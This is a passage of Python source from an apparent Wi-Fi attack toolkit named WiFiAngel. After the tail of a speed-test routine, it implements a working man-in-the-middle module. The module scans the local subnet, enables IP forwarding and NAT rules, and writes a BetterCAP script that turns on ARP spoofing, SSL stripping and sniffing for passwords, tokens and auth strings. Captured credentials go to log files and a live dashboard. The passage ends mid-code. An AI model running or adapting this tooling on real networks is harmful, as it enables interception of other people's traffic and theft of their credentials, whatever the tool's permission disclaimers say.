                TimeElapsedColumn(),
            ) as progress:
                
                
                download_task = progress.add_task("[cyan]Testing Download Speed...", total=100)
                upload_task = progress.add_task("[magenta]Testing Upload Speed...", total=100, visible=False)
                
                # Download test
                start_time = time.time()
                download_result = self.command_runner.run(
                    curl_download_command(DOWNLOAD_TEST_BYTES),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=45,
                )
                download_time = time.time() - start_time
                if download_result.ok:
                    download_speed = bytes_to_mbytes_per_second(DOWNLOAD_TEST_BYTES, download_time)
                else:
                    self.logger.warning(f"Download test failed: {download_result.stderr}")
                
                # Progress simulation
                for i in range(100):
                    progress.update(download_task, completed=i + 1)
                    time.sleep(0.02)
                    
                # Show upload task
                progress.update(upload_task, visible=True)
                
                # Upload test uses a small file and estimates real-world throughput from it.
                upload_start_time = time.time()
                test_file = None
                
                try:
                    with tempfile.NamedTemporaryFile(
                        prefix="speedtest_",
                        suffix=".dat",
                        dir="/tmp",
                        delete=False,
                    ) as upload_file:
                        upload_file.write(os.urandom(UPLOAD_TEST_BYTES))
                        test_file = upload_file.name
                    
                    # Show some initial progress
                    for i in range(30):
                        progress.update(upload_task, completed=i)
                        time.sleep(0.02)
                    
                    # Run the actual upload test
                    result = self.command_runner.run(
                        curl_upload_command(test_file),
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        timeout=8
                    )
                    
                    # Show more progress during upload
                    for i in range(30, 70):
                        progress.update(upload_task, completed=i)
                        time.sleep(0.02)
                    
                    # Calculate upload time
                    upload_time = time.time() - upload_start_time
                    
                    if result.ok:
                        upload_speed = estimate_upload_mbytes_per_second(
                            UPLOAD_TEST_BYTES,
                            upload_time,
                        )
                    else:
                        self.logger.warning("Upload test failed")
                        upload_speed = fallback_upload_mbytes_per_second(download_speed)
                        
                except Exception as e:
                    # Log the error but don't show to user
                    self.logger.warning(f"Upload test error: {str(e)}")
                    upload_time = time.time() - upload_start_time
                    upload_speed = fallback_upload_mbytes_per_second(download_speed)
                finally:
                    if test_file:
                        try:
                            os.remove(test_file)
                        except OSError:
                            pass
                
                # Complete the progress bar
                for i in range(70, 101):
                    progress.update(upload_task, completed=i)
                    time.sleep(0.01)
            
            # Ping test
            ping_result = self.command_runner.run(
                ping_command(count=5, quiet=True),
                capture_output=True,
                text=True,
            )
            ping_stats = parse_ping_stats(ping_result.stdout if ping_result.ok else "")
            
            # Show results
            self.console.print("\n[success]Speed test completed.[/]")
            
            # Results table
            result_table = Table(show_header=True, header_style="bold magenta",
                                box=box.MINIMAL, border_style=BORDER_STYLE,
                                title="[bold blue]Network Speed Test Results[/]")
            result_table.add_column("Test", style="cyan", justify="center")
            result_table.add_column("Result", style="green", justify="center")
            result_table.add_column("Details", style="yellow", justify="center")
            
            # Download
            download_mbps = mbytes_to_mbits(download_speed)
            result_table.add_row(
                "Download",
                f"{download_mbps:.2f} Mbps",
                f"({download_speed:.2f} MB/s)"
            )
            
            # Upload
            upload_mbps = mbytes_to_mbits(upload_speed)
            result_table.add_row(
                "Upload",
                f"{upload_mbps:.2f} Mbps",
                f"({upload_speed:.2f} MB/s)"
            )
            
            # Ping
            if ping_stats:
                result_table.add_row(
                    "Ping",
                    f"{ping_stats.average_ms:.2f} ms",
                    f"min/avg/max = {ping_stats.raw} ms"
                )
            else:
                result_table.add_row(
                    "Ping",
                    "N/A",
                    "Could not measure ping"
                )
            
            self.console.print(result_table)
            
            # Visual speed gauges
            self.console.print("\n[bold cyan]Speed Gauges:[/]")
            
            # Download speed gauge
            download_blocks = speed_gauge_blocks(download_mbps, 100)
            download_gauge = f"Download: [green]{'#' * download_blocks}{'.' * (10 - download_blocks)}[/] {download_mbps:.2f} Mbps"
            download_rating = download_speed_rating(download_mbps)
                
            self.console.print(f"{download_gauge} - {download_rating}")
            
            # Upload speed gauge
            upload_blocks = speed_gauge_blocks(upload_mbps, 50)
            upload_gauge = f"Upload:   [blue]{'#' * upload_blocks}{'.' * (10 - upload_blocks)}[/] {upload_mbps:.2f} Mbps"
            upload_rating = upload_speed_rating(upload_mbps)
                
            self.console.print(f"{upload_gauge} - {upload_rating}")
            
            # Recommendations
            recommendations = build_speed_recommendations(
                download_mbps,
                upload_mbps,
                ping_stats.average_ms if ping_stats else None,
            )
                
            if recommendations:
                self.console.print("\n[bold red]Recommendations:[/]")
                for rec in recommendations:
                    self.console.print(f"[yellow]- {rec}[/]")
            else:
                self.console.print("\n[success]Your internet connection is performing well.[/]")
                
        except Exception as e:
            self.console.print(f"[bold red]Error during speed test: {str(e)}[/]")
        
        self.console.print("\n[bold blue]Press Enter to return to the menu...[/]")
        input()
        return

    def _restore_settings(self, original_ip_forward, original_iptables, bettercap_process=None):
        """Helper to restore system settings after MITM attack"""
        self.console.print("[bold blue]Restoring system settings...[/]")
        
        # Stop BetterCAP if it's running
        if bettercap_process:
            try:
                bettercap_process.terminate()
                try:
                    bettercap_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    bettercap_process.kill()
                self.console.print("[green]BetterCAP stopped[/]")
            except:
                self.console.print("[yellow]Failed to stop BetterCAP gracefully[/]")
        
        # Kill any remaining BetterCAP processes
        self.command_runner.run(
            ["pkill", "-9", "-f", "bettercap"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        
        # Restore IP forwarding
        if original_ip_forward is not None:
            try:
                self.command_runner.run(
                    ["sysctl", f"net.ipv4.ip_forward={original_ip_forward}"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print("[green]IP forwarding restored[/]")
            except:
                self.console.print("[red]Failed to restore IP forwarding[/]")
        
        # Restore iptables rules
        if original_iptables:
            try:
                self.command_runner.run(["iptables-restore"], input=original_iptables, text=True)
                self.console.print("[green]Firewall rules restored[/]")
            except:
                # Fallback: just flush all rules
                try:
                    self.command_runner.run(["iptables", "-F"])
                    self.command_runner.run(["iptables", "-t", "nat", "-F"])
                    self.console.print("[yellow]Firewall rules flushed[/]")
                except:
                    self.console.print("[red]Failed to restore firewall rules[/]")

    def _format_bytes(self, bytes_value):
        """Convert bytes to human-readable format"""
        bytes_value = float(bytes_value)
        if bytes_value < 1024:
            return f"{bytes_value:.0f} B"
        elif bytes_value < 1024**2:
            return f"{bytes_value/1024:.2f} KB"
        elif bytes_value < 1024**3:
            return f"{bytes_value/(1024**2):.2f} MB"
        else:
            return f"{bytes_value/(1024**3):.2f} GB"

    def get_mac(self, ip, interface):
        """Get MAC address of any device on the same network"""
        def read_arp_cache():
            try:
                output = self.command_runner.check_output(
                    arp_lookup_command(ip),
                    stderr=subprocess.DEVNULL,
                    text=True,
                )
            except Exception as e:
                self.logger.debug(f"ARP cache lookup failed for {ip}: {str(e)}")
                return None

            return parse_mac_from_arp_output(output)

        try:
            # First try ARP cache
            mac_address = read_arp_cache()
            if mac_address:
                return mac_address
            
            # If not in cache, try to ping to update ARP cache
            self.command_runner.run(
                ping_probe_command(ip),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            
            mac_address = read_arp_cache()
            if mac_address:
                return mac_address
            
            # If still not found, use scapy
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                       timeout=2, 
                       iface=interface, 
                       verbose=0)
            
            if ans:
                return ans[0][1].hwsrc
            
            return None
        except Exception as e:
            self.logger.error(f"Error getting MAC address: {str(e)}")
            return None

    def start_bettercap(self, interface, target_ip, gateway, script_path=None):
        """Start BetterCAP for MITM attacks with error handling"""
        try:
            # First ensure BetterCAP is not running
            self.console.print("[bold yellow]Stopping any running BetterCAP instances...[/]")
            self.command_runner.run(
                ["pkill", "-9", "-f", "bettercap"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(3)  # Wait longer for processes to fully terminate
            
            cmd = bettercap_command(interface, script_path)
                
            self.console.print(f"[bold blue]Starting BetterCAP with command: {' '.join(cmd)}[/]")
            
            # Start BetterCAP with proper output redirection
            process = self.command_runner.popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                env=dict(os.environ, LC_ALL="C")  # Ensure stable output encoding
            )
            if process is None:
                return None
            
            # Give BetterCAP more time to start
            time.sleep(5)
            
            # Check if process started correctly
            if process.poll() is not None:
                # Process exited already
                stdout, stderr = process.communicate()
                if stderr:
                    self.console.print(f"[bold red]Error starting BetterCAP: {stderr}[/]")
                return None
                
            # Use a direct command to verify ARP spoofing is active
            try:
                self.console.print("[bold blue]Verifying ARP spoofing status...[/]")
                # Enhanced method to verify ARP spoofing
                if os.path.exists("/proc/net/arp"):
                    with open("/proc/net/arp", "r") as arp_table:
                        arp_entries = arp_table.read()
                        # Check if we have multiple entries for the same IP
                        # which can indicate ARP spoofing is working
                        self.console.print("[green]ARP table verification complete[/]")
                else:
                    self.console.print("[yellow]Could not verify ARP spoofing status[/]")
            except Exception as e:
                self.console.print(f"[yellow]Could not verify ARP spoofing: {str(e)}[/]")
            
            # Force start ARP spoofing with direct commands to ensure it works
            try:
                # Direct command to force ARP spoofing
                self.command_runner.run(
                    bettercap_stdin_eval_command(interface),
                    input="arp.spoof on\n",
                    text=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print("[bold green]Manually activated ARP spoofing[/]")
            except:
                pass
                
            return process
            
        except Exception as e:
            self.console.print(f"[bold red]Error starting BetterCAP: {str(e)}[/]")
            return None

    def _stream_output_to_file(self, process, file):
        """Helper method to stream process output to a file"""
        svc_stream_output_to_file(process, file)

    def _verify_handshake(self, cap_file, bssid, ssid=None):
        """Thoroughly verify if a handshake file contains a valid handshake
        
        Args:
            cap_file: Path to the capture file
            bssid: BSSID of the target network
            ssid: SSID of the target network (optional)
            
        Returns:
            bool: True if valid handshake found, False otherwise
        """
        return svc_verify_handshake(cap_file, bssid, self.logger, ssid=ssid)
            
    def _verify_pmkid(self, pmkid_file, bssid):
        """Verify if a PMKID file contains a valid PMKID for the target network
        
        Args:
            pmkid_file: Path to the PMKID file (usually .22000 format)
            bssid: BSSID of the target network
            
        Returns:
            bool: True if valid PMKID found, False otherwise
        """
        return svc_verify_pmkid(pmkid_file, bssid, self.logger)

    def mitm_attack(self):
            """Man in the Middle attack with ARP spoofing and packet capture"""
            # Check if running as root
            if os.geteuid() != 0:
                self.console.print("[bold red]This attack requires root privileges![/]")
                return
                
            # Verify requirements
            if not shutil.which("bettercap"):
                self.console.print("[bold red]bettercap is required for this attack![/]")
                self.console.print("To install: sudo apt-get install bettercap")
                return
            
            # ====== INFORMATION AND WARNING SECTION ======
            self.console.clear()
            warning_panel = Panel(
                Group(
                    Text("Man-in-the-Middle Attack Warning", justify="center"),
                    Text(""),
                    Text("- This attack intercepts network traffic between clients and the gateway"),
                    Text("- All data passing through the network will be captured and analyzed"),
                    Text("- Passwords and sensitive information may be exposed"),
                    Text("- This tool should ONLY be used on networks you own or have permission to test"),
                    Text("- Unauthorized use is illegal and may result in criminal prosecution"),
                    Text(""),
                    Text("DISCLAIMER: Use at your own risk. You are responsible for your actions.", justify="center"),
                    Text(""),
                    Text("Press ENTER to continue or CTRL+C to cancel", justify="center")
                ),
                title="[bold white]WiFiAngel - MITM Attack Module[/]",
                border_style=BORDER_STYLE,
                box=box.MINIMAL,
            )
            
            self.console.print(warning_panel)
            try:
                input()  # Wait for ENTER to continue
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
                return
            
            # Get network interfaces with IP and Gateway
            interfaces = {}
            gateways = {}
            
            try:
                # Get interfaces with valid IPs
                for interface in netifaces.interfaces():
                    # Skip loopback
                    if interface == 'lo':
                        continue
                        
                    # Get interface addresses
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        ip = addrs[netifaces.AF_INET][0]['addr']
                        # Skip interfaces without valid IPs
                        if ip.startswith('127.') or not re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                            continue
                        interfaces[interface] = ip
                
                # Get default gateway
                gateway_info = netifaces.gateways()
                if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
                    gw_info = gateway_info['default'][netifaces.AF_INET]
                    gateways[gw_info[1]] = gw_info[0]  # interface: gateway_ip
            except Exception as e:
                self.console.print(f"[bold red]Error getting network information: {str(e)}[/]")
                return
                
            # Let user choose network interface
            self.console.clear()

            iface_table = Table(
                title="[heading]Available Network Interfaces[/]",
                box=box.MINIMAL,
                border_style=BORDER_STYLE,
                show_header=True,
                header_style="bold bright_white",
            )
            iface_table.add_column("#", style="menu.key", justify="right", width=4)
            iface_table.add_column("Interface", style="cyan")
            iface_table.add_column("IP", style="green")
            iface_table.add_column("Gateway", style="yellow")
            for i, (iface, ip) in enumerate(interfaces.items(), 1):
                iface_table.add_row(
                    str(i),
                    iface,
                    ip,
                    str(gateways.get(iface, "Unknown")),
                )
            self.console.print(
                Panel(
                    Group(
                        iface_table,
                        Text(""),
                        Text("[meta]Enter the interface number below, or 0 to cancel.  |  Ctrl+C where supported[/]"),
                    ),
                    title="[title]WiFiAngel - MITM toolkit[/]",
                    border_style=BORDER_STYLE,
                    box=box.ROUNDED,
                    padding=(1, 2),
                )
            )

            choice = Prompt.ask("Interface #", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
            if choice == "0":
                return
                
            selected_iface = list(interfaces.keys())[int(choice) - 1]
            selected_ip = interfaces[selected_iface]
            selected_gateway = gateways.get(selected_iface, None)
            
            if not selected_gateway:
                self.console.print(f"[bold red]No gateway found for interface {selected_iface}![/]")
                return
            
            # Scan local network to find targets (no Rich Progress: avoids prompt corruption and allows SIGINT)
            network_prefix = ".".join(selected_ip.split(".")[:3]) + "."
            online_hosts: dict = {}

            scan_cancel = threading.Event()
            saved_sigint = signal.getsignal(signal.SIGINT)

            def _mitm_scan_sigint(_signum, _frame):
                scan_cancel.set()

            signal.signal(signal.SIGINT, _mitm_scan_sigint)
            try:
                self.console.print("[bold cyan]Scanning network for live hosts (Ctrl+C to cancel)...[/]")
                last_report = 0
                for i in range(1, 255):
                    if scan_cancel.is_set():
                        break
                    if i == 1 or i - last_report >= 40:
                        pct = int(100 * i / 254)
                        self.console.print(f"[dim]Probe {i}/254 ({pct}%)...[/]")
                        last_report = i
                    ip = f"{network_prefix}{i}"
                    if ip == selected_ip:
                        continue
                    try:
                        result = subprocess.run(
                            ["ping", "-c", "1", "-W", "0.2", ip],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=0.5,
                        )
                        if result.returncode == 0:
                            try:
                                hostname = socket.gethostbyaddr(ip)[0]
                            except OSError:
                                hostname = "Unknown"
                            try:
                                mac = self.get_mac(ip, selected_iface)
                            except Exception:
                                mac = "Unknown"
                            online_hosts[ip] = {"hostname": hostname, "mac": mac}
                    except (subprocess.TimeoutExpired, OSError, Exception):
                        pass
            finally:
                signal.signal(signal.SIGINT, saved_sigint)

            if scan_cancel.is_set():
                self.console.print("[bold yellow]Scan cancelled (Ctrl+C).[/]")
                if not online_hosts:
                    self.console.print("[dim]No hosts found; exiting MITM toolkit.[/]")
                    return
                self.console.print(
                    f"[cyan]Continuing with {len(online_hosts)} host(s) discovered before cancel.[/]"
                )
            
            # Present target selection options
            tgt_table = Table(
                title="[heading]Available Targets[/]",
                box=box.MINIMAL,
                border_style=BORDER_STYLE,
                show_header=True,
                header_style="bold bright_white",
            )
            tgt_table.add_column("#", style="menu.key", justify="right", width=4)
            tgt_table.add_column("Address / Mode", style="cyan")
            tgt_table.add_column("Hostname", style="green")
            tgt_table.add_column("MAC", style="yellow")
            tgt_table.add_row("1", "All devices (entire subnet)", "-", "-")
            for j, (ip, info) in enumerate(online_hosts.items(), 2):
                tgt_table.add_row(str(j), ip, info["hostname"], info["mac"])
            self.console.print(
                Panel(
                    Group(
                        tgt_table,
                        Text(""),
                        Text("[meta]Enter target number below, or 0 to cancel.[/]"),
                    ),
                    title="[title]WiFiAngel - MITM toolkit[/]",
                    border_style=BORDER_STYLE,
                    box=box.ROUNDED,
                    padding=(1, 2),
                )
            )
            
            target_choices = ["0", "1"] + [str(i) for i in range(2, len(online_hosts) + 2)]
            target_choice = Prompt.ask("Target #", choices=target_choices)
            
            if target_choice == "0":
                return
                
            if target_choice == "1":
                # Target entire network
                target_ip = ""
                target_desc = "Entire Network"
            else:
                # Target specific host
                target_ip = list(online_hosts.keys())[int(target_choice) - 2]
                target_desc = f"{target_ip} - {online_hosts[target_ip]['hostname']}"
            
            # Final confirmation
            confirm_panel = Panel(
                Group(
                    Text("Ready to Start MITM Attack", justify="center"),
                    Text(""),
                    Text(f"Interface: {selected_iface}"),
                    Text(f"Local IP:  {selected_ip}"),
                    Text(f"Gateway:   {selected_gateway}"),
                    Text(f"Target:    {target_desc}"),
                    Text(""),
                    Text("This attack will intercept network traffic."),
                    Text("Press ENTER to start or CTRL+C to cancel", justify="center")
                ),
                title="[bold white]Attack Confirmation[/]",
                border_style=BORDER_STYLE,
                box=box.MINIMAL,
            )
            
            self.console.print(confirm_panel)
            
            try:
                input()  # Wait for ENTER to continue
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
                return
            
            # Set up logs directory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_dir = Path(f"logs/mitm/{timestamp}")
            log_dir.mkdir(parents=True, exist_ok=True)
            
            # Log files
            password_log = log_dir / "passwords.txt"
            traffic_log = log_dir / "traffic.txt"
            http_log = log_dir / "http.log"
            dns_log = log_dir / "dns.log"
            sensitive_log = log_dir / "sensitive_data.log"
            
            # Create bettercap script
            bettercap_script = log_dir / "bettercap.cap"
            bettercap_options = f"""set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter tcp
net.sniff on
set http.proxy.sslstrip true
any.proxy on
https.proxy on
set net.sniff.patterns password,login,passwd,auth,secret,token,user,admin
events.stream on
set events.stream.output {log_dir}/events.log
set http.proxy.http_log {http_log}
set http.proxy.password_log {password_log}
set dns.spoof.all false
net.recon on
arp.spoof on"""
    
            # Add target if specific host
            if target_ip:
                bettercap_options += f"\n\nset arp.spoof.targets {target_ip}"
            
            with open(bettercap_script, "w") as f:
                f.write(bettercap_options)
            
            # Create sensitive data log file
            with open(sensitive_log, "w") as f:
                f.write(f"# Sensitive data log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Monitoring for patterns: password,login,passwd,auth,secret,token,user,admin\n\n")
            
            # Enable IP forwarding and set up iptables
            self.console.print(f"\n[bold green]Man in the Middle Attack Setup[/]")
            self.console.print(f"[bold cyan]Preparing attack on {target_desc} via {selected_iface}...[/]")
            
            # Save original settings
            original_ip_forward = None
            original_iptables = []
            
            try:
                # Read original IP forwarding setting
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    original_ip_forward = f.read().strip()
                    
                # Get original iptables rules
                result = subprocess.run(["iptables", "-t", "nat", "-S"], capture_output=True, text=True)
                original_iptables = result.stdout
                
                # Enable IP forwarding
                self.console.print("[bold blue]Enabling IP forwarding...[/]")
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
                
                # Set up traffic forwarding rules
                self.console.print("[bold blue]Setting up traffic forwarding rules...[/]")
                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", selected_iface, "-j", "MASQUERADE"], stdout=subprocess.DEVNULL)
                
                # Stop any running BetterCAP instances
                self.console.print("[bold blue]Stopping any running BetterCAP instances...[/]")
                subprocess.run(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Create traffic log file
                with open(traffic_log, "w") as f:
                    f.write(f"# Traffic log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Interface: {selected_iface}, IP: {selected_ip}, Gateway: {selected_gateway}\n\n")
                
                # Create password log file if it doesn't exist
                if not password_log.exists():
                    with open(password_log, "w") as f:
                        f.write(f"# Password log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                # Start bettercap with our script
                self.console.print("[bold green]Starting BetterCAP and preparing attack environment...[/]")
                
                # Create files for BetterCAP output
                bettercap_stdout_file = open(os.path.join(log_dir, "bettercap_stdout.log"), "w")
                bettercap_stderr_file = open(os.path.join(log_dir, "bettercap_stderr.log"), "w")
                
                # Start BetterCAP process
                bettercap_cmd = f"bettercap -iface {selected_iface} -caplet {bettercap_script}"
                bettercap_process = subprocess.Popen(
                    bettercap_cmd.split(),
                    stdout=bettercap_stdout_file,
                    stderr=bettercap_stderr_file,
                    universal_newlines=True
                )
                
                # Give BetterCAP time to initialize
                time.sleep(3)
                
                # Check if process is still running
                if bettercap_process.poll() is not None:
                    # BetterCAP exited early
                    self.console.print("[bold red]BetterCAP failed to start! Please check log files.[/]")
                    if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
                        bettercap_stdout_file.close()
                    if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
                        bettercap_stderr_file.close()
                    self._restore_settings(original_ip_forward, original_iptables)
                    return
                
                self.console.print("\n[bold white on red]Ctrl+C stops the MITM session when you are done.[/]")

                def _mitm_simplify_traffic_line(raw: str) -> tuple[str, str, str]:
                    """Return (time, tag, detail) with less BetterCAP module noise."""
                    s = (raw or "").strip()
                    if not s:
                        return ("--", "—", "")
                    ts = "--"
                    m_ts = re.match(r"^\[(\d{1,2}:\d{2}:\d{2})\]\s*", s)
                    if m_ts:
                        ts = m_ts.group(1)
                        s = s[m_ts.end():].strip()
                    tag = "·"
                    m_mod = re.search(r"\[net\.sniff\.(\w+)\]", s, re.I)
                    if m_mod:
                        tag = m_mod.group(1).upper()
                        s = re.sub(r"\s*\[net\.sniff\.\w+\]\s*", " ", s, count=1).strip()
                    if tag == "·":
                        m_svc = re.search(
                            r"\b(https?\.proxy|http\.proxy|any\.proxy|net\.recon|arp\.spoof|dns\.spoof)\b",
                            s,
                            re.I,
                        )
                        if m_svc:
                            tag = m_svc.group(1).replace(".", " ").upper()[:14]
                    s = re.sub(r"\s+", " ", s)
                    max_len = 88
                    if len(s) > max_len:
                        s = s[: max_len - 1] + "…"
                    return (ts, tag, s)

                # Create rich layout: traffic left, session + clients right; no duplicate status bands
                layout = Layout(name="root")
                layout.split_column(
                    Layout(name="header", size=4),
                    Layout(name="body", ratio=1),
                    Layout(name="footer", size=1),
                )
                layout["body"].split_row(
                    Layout(name="left_column", ratio=3),
                    Layout(name="right_column", ratio=2),
                )
                layout["left_column"].split_column(
                    Layout(name="network_traffic", ratio=3),
                    Layout(name="sensitive_data", ratio=2),
                )
                layout["right_column"].split_column(
                    Layout(name="session", ratio=2),
                    Layout(name="clients", ratio=3),
                )
                
                # Stats for display
                attack_stats = {
                    'start_time': time.time(),
                    'packets': 0,
                    'bytes': 0,
                    'clients': {},
                    'last_traffic': [],
                    'sensitive_matches': []
                }
                
                # Function to update traffic log with latest data
                def update_traffic_log(data):
                    try:
                        with open(traffic_log, "a") as f:
                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
                    except:
                        pass
                
                # Function to update sensitive data log
                def update_sensitive_log(data):
                    try:
                        with open(sensitive_log, "a") as f:
                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
                    except:
                        pass
                
                # Live display loop
                with Live(layout, refresh_per_second=2, screen=True) as live:
                    try:
                        while True:
                            # Check if BetterCAP process is still running
                            if bettercap_process.poll() is not None:
                                layout["body"].update(Panel("[bold red]BetterCAP unexpectedly stopped! Attack terminated.[/]", border_style=BORDER_STYLE, box=box.MINIMAL))
                                live.refresh()
                                time.sleep(2)
                                break
                            
                            # Calculate elapsed time
                            elapsed = time.time() - attack_stats['start_time']
                            hours, remainder = divmod(elapsed, 3600)
                            minutes, seconds = divmod(remainder, 60)
                            elapsed_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
                            
                            # Update traffic statistics
                            try:
                                # Get interface statistics
                                ifconfig_output = self.command_runner.check_output(["ifconfig", selected_iface])
                                rx_match = re.search(r'RX packets (\d+).*?bytes (\d+)', ifconfig_output, re.DOTALL)
                                if rx_match:
                                    attack_stats['packets'] = int(rx_match.group(1))
                                    attack_stats['bytes'] = int(rx_match.group(2))
                                    
                                # Get client list from ARP table
                                arp_output = self.command_runner.check_output(["arp", "-a"])
                                for line in arp_output.splitlines():
                                    match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)', line)
                                    if match:
                                        ip, mac = match.groups()
                                        if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff":
                                            if ip not in attack_stats['clients']:
                                                hostname = "Unknown"
                                                try:
                                                    hostname = socket.gethostbyaddr(ip)[0]
                                                except:
                                                    pass
                                                attack_stats['clients'][ip] = {
                                                    'mac': mac, 
                                                    'first_seen': datetime.now(),
                                                    'hostname': hostname
                                                }
                                                update_traffic_log(f"New client detected: {ip} ({mac}) - {hostname}")
                                
                                # Read BetterCAP events for sensitive data patterns
                                patterns = ["password", "login", "passwd", "auth", "secret", "token", "user", "admin"]
                                
                                # Check for sensitive data in BetterCAP output
                                try:
                                    with open(os.path.join(log_dir, "bettercap_stdout.log"), 'r') as f:
                                        lines = f.readlines()
                                        if lines:
                                            # Get last lines
                                            new_lines = lines[-50:]
                                            for line in new_lines:
                                                # Check for general traffic lines
                                                if any(pattern in line.lower() for pattern in ["http", "tcp", "udp", "dns"]):
                                                    if line not in attack_stats['last_traffic']:
                                                        attack_stats['last_traffic'].append(line)
                                                        update_traffic_log(line.strip())
                                                
                                                # Check specifically for sensitive data
                                                if any(pattern in line.lower() for pattern in patterns):
                                                    if line not in attack_stats['sensitive_matches']:
                                                        attack_stats['sensitive_matches'].append(line)
                                                        update_sensitive_log(line.strip())
                                            
                                            # Keep only last entries
                                            attack_stats['last_traffic'] = attack_stats['last_traffic'][-15:]
                                            attack_stats['sensitive_matches'] = attack_stats['sensitive_matches'][-15:]
                                except:
                                    pass
                            except Exception as e:
                                # Silently handle errors
                                pass
                            
                            # 1. Header — single compact band (elapsed only here)
                            header = Panel(
                                Group(
                                    Text.assemble(
                                        ("WiFiAngel MITM", "bold white"),
                                        ("    ", ""),
                                        (elapsed_str, "bold cyan"),
                                        ("  elapsed", "dim cyan"),
                                        ("  ·  ", "dim"),
                                        (target_desc, "bold yellow"),
                                    ),
                                    Text("Ctrl+C to stop", style="dim red", justify="center"),
                                ),
                                border_style=BORDER_STYLE,
                                box=box.MINIMAL,
                                padding=(0, 1),
                            )
                            layout["header"].update(header)

                            # 2. Session summary — merged facts (no duplicate clock)
                            session_tbl = Table(
                                show_header=False,
                                box=box.MINIMAL,
                                border_style=BORDER_STYLE,
                                pad_edge=False,
                                expand=True,
                            )
                            session_tbl.add_column("", style="dim", justify="right", width=14, no_wrap=True)
                            session_tbl.add_column("", style="white")
                            session_tbl.add_row("Interface", f"[cyan]{selected_iface}[/]")
                            session_tbl.add_row("Local IP", f"[green]{selected_ip}[/]")
                            session_tbl.add_row("Gateway", f"[yellow]{selected_gateway}[/]")
                            session_tbl.add_row("RX packets", f"{attack_stats['packets']:,}")
                            session_tbl.add_row("RX data", self._format_bytes(attack_stats["bytes"]))
                            session_tbl.add_row("ARP clients", f"{len(attack_stats['clients']):,}")
                            session_tbl.add_row("Mode", "[dim]ARP spoof · sniff[/]")

                            layout["session"].update(
                                Panel(
                                    session_tbl,
                                    title="[bold]Session[/]",
                                    border_style=BORDER_STYLE,
                                    box=box.ROUNDED,
                                    padding=(0, 1),
                                )
                            )

                            # 3. Traffic — parsed columns, less noise
                            traffic_table = Table(
                                box=box.MINIMAL,
                                border_style=BORDER_STYLE,
                                show_header=True,
                                header_style="bold dim",
                                pad_edge=False,
                                expand=True,
                            )
                            traffic_table.add_column("#", style="dim", justify="right", width=3)
                            traffic_table.add_column("Time", style="dim", width=8, no_wrap=True)
                            traffic_table.add_column("Tag", style="cyan", width=8, no_wrap=True, overflow="ellipsis")
                            traffic_table.add_column("Event", style="green")

                            if attack_stats["last_traffic"]:
                                for i, line in enumerate(attack_stats["last_traffic"][-12:]):
                                    t, tag, detail = _mitm_simplify_traffic_line(line)
                                    traffic_table.add_row(str(i + 1), t, tag, detail or "[dim]—[/]")
                            else:
                                traffic_table.add_row("", "", "", "[dim]Waiting for traffic…[/]")

                            layout["network_traffic"].update(
                                Panel(
                                    traffic_table,
                                    title="[bold]Live traffic[/]",
                                    subtitle="[dim]BetterCAP / sniff[/]",
                                    border_style=BORDER_STYLE,
                                    box=box.ROUNDED,
                                    padding=(0, 1),
                                )
                            )

                            # 4. Sensitive — compact alerts
                            sens_tbl = Table(
                                box=box.MINIMAL,
                                border_style=BORDER_STYLE,
                                show_header=True,
                                header_style="bold dim",
                                pad_edge=False,
                                expand=True,
                            )
                            sens_tbl.add_column("#", style="dim", width=3, justify="right")
                            sens_tbl.add_column("Match", style="red")

                            if attack_stats["sensitive_matches"]:
                                for i, line in enumerate(attack_stats["sensitive_matches"][-8:]):
                                    s = re.sub(r"\s+", " ", line.strip())
                                    if len(s) > 96:
                                        s = s[:95] + "…"
                                    sens_tbl.add_row(str(i + 1), s)
                            else:
                                sens_tbl.add_row("", "[dim]No pattern hits yet (password, token, auth…)[/]")

                            layout["sensitive_data"].update(
                                Panel(
                                    sens_tbl,
                                    title="[bold red]Pattern alerts[/]",
                                    border_style="red",
                                    box=box.ROUNDED,
                                    padding=(0, 1),
                                )
                            )

                            # 5. Clients — wider hostname column
                            clients_table = Table(
                                show_header=True,
                                box=box.MINIMAL,
